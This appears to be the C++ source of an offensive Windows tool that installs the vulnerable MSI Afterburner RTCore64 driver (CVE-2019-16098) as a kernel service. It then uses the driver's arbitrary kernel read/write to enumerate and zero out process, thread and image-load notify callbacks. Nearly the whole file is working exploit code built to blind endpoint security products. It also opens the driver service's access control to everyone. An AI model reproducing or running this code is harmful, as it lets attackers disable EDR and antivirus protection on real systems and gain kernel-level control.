// Many thanks to
// https://github.com/Barakat/CVE-2019-16098 - original exploit
// https://github.com/RedCursorSecurityConsulting/PPLKiller - multiple code snippets were re-used here

#include <Windows.h>
#include <aclapi.h>
#include <Psapi.h>
#include <cstdio>
#include <iostream>

#if !defined(PRINT_ERROR_AUTO)
#define PRINT_ERROR_AUTO(func) (wprintf(L"ERROR " TEXT(__FUNCTION__) L" ; " func L" (0x%08x)\n", GetLastError()))
#endif


struct RTCORE64_MSR_READ {
    DWORD Register;
    DWORD ValueHigh;
    DWORD ValueLow;
};
static_assert(sizeof(RTCORE64_MSR_READ) == 12, "sizeof RTCORE64_MSR_READ must be 12 bytes");

struct RTCORE64_MEMORY_READ {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};
static_assert(sizeof(RTCORE64_MEMORY_READ) == 48, "sizeof RTCORE64_MEMORY_READ must be 48 bytes");

struct RTCORE64_MEMORY_WRITE {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};
static_assert(sizeof(RTCORE64_MEMORY_WRITE) == 48, "sizeof RTCORE64_MEMORY_WRITE must be 48 bytes");

static const DWORD RTCORE64_MSR_READ_CODE = 0x80002030;
static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;

DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;

    DWORD BytesReturned;

    DeviceIoControl(Device,
        RTCORE64_MEMORY_READ_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);

    return MemoryRead.Value;
}

void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;
    MemoryRead.Value = Value;

    DWORD BytesReturned;

    DeviceIoControl(Device,
        RTCORE64_MEMORY_WRITE_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);
}

WORD ReadMemoryWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 2, Address) & 0xffff;
}

DWORD ReadMemoryDWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 4, Address);
}

DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address) {
    return (static_cast<DWORD64>(ReadMemoryDWORD(Device, Address + 4)) << 32) | ReadMemoryDWORD(Device, Address);
}

void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value) {
    WriteMemoryPrimitive(Device, 4, Address, Value & 0xffffffff);
    WriteMemoryPrimitive(Device, 4, Address + 4, Value >> 32);
}


void Log(const char* Message, ...) {
    const auto file = stderr;

    va_list Args;
    va_start(Args, Message);
    std::vfprintf(file, Message, Args);
    std::fputc('\n', file);
    va_end(Args);
}

DWORD64 Findkrnlbase() {
    DWORD cbNeeded = 0;
    LPVOID drivers[1024];

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
        return (DWORD64)drivers[0];
    }

    return NULL;
}

//Mimikatz code to load / unload driver

BOOL kull_m_service_addWorldToSD(SC_HANDLE monHandle) {
    BOOL status = FALSE;
    DWORD dwSizeNeeded;
    PSECURITY_DESCRIPTOR oldSd, newSd;
    SECURITY_DESCRIPTOR dummySdForXP;
    SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
    EXPLICIT_ACCESS ForEveryOne = {
        SERVICE_QUERY_STATUS | SERVICE_QUERY_CONFIG | SERVICE_INTERROGATE | SERVICE_ENUMERATE_DEPENDENTS | SERVICE_PAUSE_CONTINUE | SERVICE_START | SERVICE_STOP | SERVICE_USER_DEFINED_CONTROL | READ_CONTROL,
        SET_ACCESS,
        NO_INHERITANCE,
        {NULL, NO_MULTIPLE_TRUSTEE, TRUSTEE_IS_SID, TRUSTEE_IS_WELL_KNOWN_GROUP, NULL}
    };
    if (!QueryServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, &dummySdForXP, 0, &dwSizeNeeded) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER)) {
        if (oldSd = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, dwSizeNeeded)) {
            if (QueryServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, oldSd, dwSizeNeeded, &dwSizeNeeded)) {
                if (AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, (PSID*)&ForEveryOne.Trustee.ptstrName)) {
                    if (BuildSecurityDescriptor(NULL, NULL, 1, &ForEveryOne, 0, NULL, oldSd, &dwSizeNeeded, &newSd) == ERROR_SUCCESS) {
                        status = SetServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, newSd);
                        LocalFree(newSd);
                    }
                    FreeSid(ForEveryOne.Trustee.ptstrName);
                }
            }
            LocalFree(oldSd);
        }
    }
    return status;
}

DWORD service_install(PCWSTR serviceName, PCWSTR displayName, PCWSTR binPath, DWORD serviceType, DWORD startType, BOOL startIt) {
    BOOL status = FALSE;
    SC_HANDLE hSC = NULL, hS = NULL;

    if (hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE)) {
        if (hS = OpenService(hSC, serviceName, SERVICE_START)) {
            wprintf(L"[+] \'%s\' service already registered\n", serviceName);
        }
        else {
            if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST) {
                wprintf(L"[*] \'%s\' service not present\n", serviceName);
                if (hS = CreateService(hSC, serviceName, displayName, READ_CONTROL | WRITE_DAC | SERVICE_START, serviceType, startType, SERVICE_ERROR_NORMAL, binPath, NULL, NULL, NULL, NULL, NULL)) {
                    wprintf(L"[+] \'%s\' service successfully registered\n", serviceName);
                    if (status = kull_m_service_addWorldToSD(hS))
                        wprintf(L"[+] \'%s\' service ACL to everyone\n", serviceName);
                    else printf("kull_m_service_addWorldToSD");
                }
                else PRINT_ERROR_AUTO(L"CreateService");
            }
            else PRINT_ERROR_AUTO(L"OpenService");
        }
        if (hS) {
            if (startIt) {
                if (status = StartService(hS, 0, NULL))
                    wprintf(L"[+] \'%s\' service started\n", serviceName);
                else if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
                    wprintf(L"[*] \'%s\' service already started\n", serviceName);
                else {
                    PRINT_ERROR_AUTO(L"StartService");
                }
            }
            CloseServiceHandle(hS);
        }
        CloseServiceHandle(hSC);
    }
    else {
        PRINT_ERROR_AUTO(L"OpenSCManager(create)");
        return GetLastError();
    }
    return 0;
}

BOOL kull_m_service_genericControl(PCWSTR serviceName, DWORD dwDesiredAccess, DWORD dwControl, LPSERVICE_STATUS ptrServiceStatus) {
    BOOL status = FALSE;
    SC_HANDLE hSC, hS;
    SERVICE_STATUS serviceStatus;

    if (hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT)) {
        if (hS = OpenService(hSC, serviceName, dwDesiredAccess)) {
            status = ControlService(hS, dwControl, ptrServiceStatus ? ptrServiceStatus : &serviceStatus);
            CloseServiceHandle(hS);
        }
        CloseServiceHandle(hSC);
    }
    return status;
}

BOOL service_uninstall(PCWSTR serviceName) {
    if (kull_m_service_genericControl(serviceName, SERVICE_STOP, SERVICE_CONTROL_STOP, NULL)) {
        wprintf(L"[+] \'%s\' service stopped\n", serviceName);
    }
    else if (GetLastError() == ERROR_SERVICE_NOT_ACTIVE) {
        wprintf(L"[*] \'%s\' service not running\n", serviceName);
    }
    else {
        PRINT_ERROR_AUTO(L"kull_m_service_stop");
        return FALSE;
    }

    if (SC_HANDLE hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT)) {
        if (SC_HANDLE hS = OpenService(hSC, serviceName, DELETE)) {
            BOOL status = DeleteService(hS);
            CloseServiceHandle(hS);
        }
        CloseServiceHandle(hSC);
    }
    return TRUE;
}
// thanks gentilkiwi!

struct Offsets {
    signed int process;
    signed int image;
    signed int thread;
};

void FindDriver(DWORD64 address) {

    LPVOID drivers[1024];
    DWORD cbNeeded;
    int cDrivers, i;
    DWORD64 diff[3][200];
    TCHAR szDriver[1024];

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
        int n = sizeof(drivers) / sizeof(drivers[0]);
        cDrivers = cbNeeded / sizeof(drivers[0]);
        int narrow = 0;
        int c = 0;
        for (i = 0; i < cDrivers; i++) {
            //we add all smaller addresses of drivers to a new array, then grab the closest. Not great, I know...
            if (address > (DWORD64)drivers[i]) {
                diff[0][c] = address;
                diff[1][c] = address - (DWORD64)drivers[i];
                diff[2][c] = (DWORD64)drivers[i];
                c++;
            }
        }
    }
    //cheeky for loop to find the smallest diff. smallest diff should be the diff of DriverBase + Diff == Callback function.
    int k = 0;
    DWORD64 temp = diff[1][0];
    for (k = 0; k < cDrivers; k++) {
        if ((temp > diff[1][k]) && (diff[0][k] == address)) {
            temp = diff[1][k];

        }
    }

    if (GetDeviceDriverBaseName(LPVOID(address - temp), szDriver, sizeof(szDriver))) {
        std::cout << "[+] " << std::hex << address << " [";
        std::wcout << szDriver << " + 0x";
        std::cout << std::hex << (int)temp;
        std::cout << "]" << std::endl;
    }
    else {
        Log("[+] Could not resolve driver for %p", address);
    }

}

struct Offsets getVersionOffsets() {
    wchar_t value[255] = { 0x00 };
    DWORD BufferSize = 255;
    RegGetValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ReleaseId", RRF_RT_REG_SZ, NULL, &value, &BufferSize);
    wprintf(L"[+] Windows Version %s Found\n", value);
    auto winVer = _wtoi(value);
    switch (winVer) {
        //case 1903:
    case 1909:
        return { -0x24D810, -0x24D810, -0x24D3F0};
    case 2004:
        return { 0x563F60, 0x563ED0, 0x563CF0 };
    default:
        wprintf(L"[!] Version Offsets Not Found!\n");

    }

}
void findimgcallbackroutine(DWORD64 remove) {
    const auto Device = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (Device == INVALID_HANDLE_VALUE) {
        Log("[!] Unable to obtain a handle to the device object");
        return;
    }
    Log("[+] Device object handle obtained: %p", Device);
    const auto NtoskrnlBaseAddress = Findkrnlbase();
    HMODULE Ntoskrnl = LoadLibraryW(L"ntoskrnl.exe");
    const DWORD64 PsSetLoadImageNotifyRoutineOffset = reinterpret_cast<DWORD64>(GetProcAddress(Ntoskrnl, "PsSetLoadImageNotifyRoutine")) - reinterpret_cast<DWORD64>(Ntoskrnl);
    FreeLibrary(Ntoskrnl);
    const DWORD64 PsSetLoadImageNotifyRoutineAddress = NtoskrnlBaseAddress + PsSetLoadImageNotifyRoutineOffset;
    Offsets offsets = getVersionOffsets();
    Log("[+] PsSetLoadImageNotifyRoutine address: %p", PsSetLoadImageNotifyRoutineAddress);
    Log("[+] Kernel base address: %p", NtoskrnlBaseAddress);
    const DWORD64 PspLoadImageNotifyRoutineAddress = PsSetLoadImageNotifyRoutineAddress + offsets.image;
    Log("[+] PspLoadImageNotifyRoutineAddress: %p", PspLoadImageNotifyRoutineAddress);
    Log("[+] Enumerating image load callbacks");
    int i = 0;
    for (i; i < 64; i++) {
        DWORD64 callback = ReadMemoryDWORD64(Device, PspLoadImageNotifyRoutineAddress + (i * 8));
        if (callback != NULL) {//only print actual callbacks
            callback = (callback &= ~(1ULL << 3) + 0x1);//shift bytes
            DWORD64 cbFunction = ReadMemoryDWORD64(Device, callback);
            FindDriver(cbFunction);
            if (cbFunction == remove) {
                Log("Removing callback to %p at address %p", cbFunction, PspLoadImageNotifyRoutineAddress + (i * 8));
                WriteMemoryDWORD64(Device, PspLoadImageNotifyRoutineAddress + (i * 8), 0x0000000000000000);
            }
        }

    }

}

void findthreadcallbackroutine(DWORD64 remove) {
    const auto Device = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (Device == INVALID_HANDLE_VALUE) {
        Log("[!] Unable to obtain a handle to the device object");
        return;
    }
    Log("[+] Device object handle obtained: %p", Device);
    const auto NtoskrnlBaseAddress = Findkrnlbase();
    HMODULE Ntoskrnl = LoadLibraryW(L"ntoskrnl.exe");
    const DWORD64 PsSetCreateThreadNotifyRoutineOffset = reinterpret_cast<DWORD64>(GetProcAddress(Ntoskrnl, "PsSetCreateThreadNotifyRoutine")) - reinterpret_cast<DWORD64>(Ntoskrnl);
    FreeLibrary(Ntoskrnl);
    const DWORD64 PsSetCreateThreadNotifyRoutineAddress = NtoskrnlBaseAddress + PsSetCreateThreadNotifyRoutineOffset;
    Offsets offsets = getVersionOffsets();
    Log("[+] PsSetCreateThreadNotifyRoutine address: %p", PsSetCreateThreadNotifyRoutineAddress);
    Log("[+] Kernel base address: %p", NtoskrnlBaseAddress);
    const DWORD64 PspCreateThreadNotifyRoutineAddress = PsSetCreateThreadNotifyRoutineAddress + offsets.thread;
    Log("[+] PspCreateThreadNotifyRoutineAddress: %p", PspCreateThreadNotifyRoutineAddress);
    Log("[+] Enumerating thread creation callbacks");
    int i = 0;
    for (i; i < 64; i++) {
        DWORD64 callback = ReadMemoryDWORD64(Device, PspCreateThreadNotifyRoutineAddress + (i * 8));
        if (callback != NULL) {//only print actual callbacks
            callback = (callback &= ~(1ULL << 3) + 0x1);//shift bytes
            DWORD64 cbFunction = ReadMemoryDWORD64(Device, callback);
            FindDriver(cbFunction);
            if (cbFunction == remove) {
                Log("Removing callback to %p at address %p", cbFunction, PspCreateThreadNotifyRoutineAddress + (i * 8));
                WriteMemoryDWORD64(Device, PspCreateThreadNotifyRoutineAddress + (i * 8), 0x0000000000000000);
            }
        }

    }

}

void findprocesscallbackroutine(DWORD64 remove) {
    //getVersionOffsets();

    const auto Device = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (Device == INVALID_HANDLE_VALUE) {
        Log("[!] Unable to obtain a handle to the device object");
        return;
    }
    Log("[+] Device object handle obtained: %p", Device);
    const auto NtoskrnlBaseAddress = Findkrnlbase();

    HMODULE Ntoskrnl = LoadLibraryW(L"ntoskrnl.exe");
    const DWORD64 PsSetCreateProcessNotifyRoutineOffset = reinterpret_cast<DWORD64>(GetProcAddress(Ntoskrnl, "PsSetCreateProcessNotifyRoutine")) - reinterpret_cast<DWORD64>(Ntoskrnl);
    FreeLibrary(Ntoskrnl);
    const DWORD64 PsSetCreateProcessNotifyRoutineAddress = NtoskrnlBaseAddress + PsSetCreateProcessNotifyRoutineOffset;

    Log("[+] PsSetCreateProcessNotifyRoutine address: %p", PsSetCreateProcessNotifyRoutineAddress);
    Log("[+] Kernel base address: %p", NtoskrnlBaseAddress);

    Offsets offsets = getVersionOffsets();
    const DWORD64 PspCreateProcessNotifyRoutineAddress = PsSetCreateProcessNotifyRoutineAddress + offsets.process;

    Log("[+] PspCreateProcessNotifyRoutine: %p", PspCreateProcessNotifyRoutineAddress);
    Log("[+] Enumerating process creation callbacks");
    int i = 0;
    for (i; i < 64; i++) {
        DWORD64 callback = ReadMemoryDWORD64(Device, PspCreateProcessNotifyRoutineAddress + (i * 8));
        if (callback != NULL) {//only print actual callbacks
            callback = (callback &= ~(1ULL << 3) + 0x1);//shift bytes
            DWORD64 cbFunction = ReadMemoryDWORD64(Device, callback);
            FindDriver(cbFunction);
            if (cbFunction == remove) {
                Log("Removing callback to %p at address %p", cbFunction, PspCreateProcessNotifyRoutineAddress + (i * 8));
                WriteMemoryDWORD64(Device, PspCreateProcessNotifyRoutineAddress + (i * 8), 0x0000000000000000);
            }
        }

    }
}
//TO DO: clean up some stuff and implement functions for some common tasks: 
// getDriverHandle()
// getExportedFunction()



int main(int argc, char* argv[]) {
    
    if (argc < 2) {
        printf("Usage: %s\n"
            " /proc - List Process Creation Callbacks\n"
            " /delproc <address> - Remove Process Creation Callback\n"
            " /thread - List Thread Creation Callbacks\n"
            " /delthread - Remove Thread Creation Callback\n"
            " /installDriver - Install the MSI driver\n"
            " /uninstallDriver - Uninstall the MSI driver\n"
            " /img - List Image Load Callbacks\n"
            " /delimg <address> - Remove Image Load Callback", argv[0]);
        return 0;
    }
    
    const auto svcName = L"RTCore64";
    const auto svcDesc = L"Micro-Star MSI Afterburner";
    const wchar_t driverName[] = L"\\RTCore64.sys";
    const auto pathSize = MAX_PATH + sizeof(driverName) / sizeof(wchar_t);
    TCHAR driverPath[pathSize];
    GetCurrentDirectory(pathSize, driverPath);
    wcsncat_s(driverPath, driverName, sizeof(driverName) / sizeof(wchar_t));


    if (strcmp(argv[1] + 1, "proc") == 0) {

        DWORD64 remove = NULL;
        findprocesscallbackroutine(remove);
    }
    else if (strcmp(argv[1] + 1, "delproc") == 0 && argc == 3) {
        DWORD64 remove;
        remove = strtoull(argv[2], NULL, 16);
        Log("[+] Removing process creation callback: %p", remove);
        findprocesscallbackroutine((DWORD64)remove);
    }
    else if (strcmp(argv[1] + 1, "installDriver") == 0) {
        if (auto status = service_install(svcName, svcDesc, driverPath, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE) == 0x00000005) {
            wprintf(L"[!] 0x00000005 - Access Denied - Did you run as administrator?\n");
        }
    }
    else if (strcmp(argv[1] + 1, "uninstallDriver") == 0) {
        service_uninstall(svcName);
    }
    else if (strcmp(argv[1] + 1, "img") == 0) {
        DWORD64 remove = NULL;
        findimgcallbackroutine(remove);
    }
    else if (strcmp(argv[1] + 1, "thread") == 0) {
        DWORD64 remove = NULL;
        findthreadcallbackroutine(remove);
    }
    else if (strcmp(argv[1] + 1, "delthread") == 0 && argc == 3) {
        DWORD64 remove;
        remove = strtoull(argv[2], NULL, 16);
        Log("[+] Removing thread creation callback: %p", remove);
        findthreadcallbackroutine((DWORD64)remove);
    }
    else if (strcmp(argv[1] + 1, "delimg") == 0 && argc == 3) {
        DWORD64 remove;
        remove = strtoull(argv[2], NULL, 16);
        Log("[+] Removing image load callback: %p", remove);
        findimgcallbackroutine((DWORD64)remove);
    }
    else {
        wprintf(L"Error: Check the help\n");

    }


    return 0;
}
